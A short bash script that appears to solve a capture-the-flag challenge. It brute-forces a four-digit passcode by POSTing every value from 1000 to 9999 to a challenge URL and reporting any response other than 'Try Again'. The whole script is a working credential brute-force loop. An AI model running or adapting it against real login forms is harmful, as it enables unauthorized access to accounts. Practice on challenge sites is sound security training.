#!/bin/bash

for i in {1000..9999}
do
	curl --silent -d "passcode=$i" -X POST https://challenges.ncc.ninja/f213dfef4a3b/ > temp.txt
	if ! grep -Fxq "Try Again" temp.txt
	then
		echo "Passcode is $i"
	fi
	
done
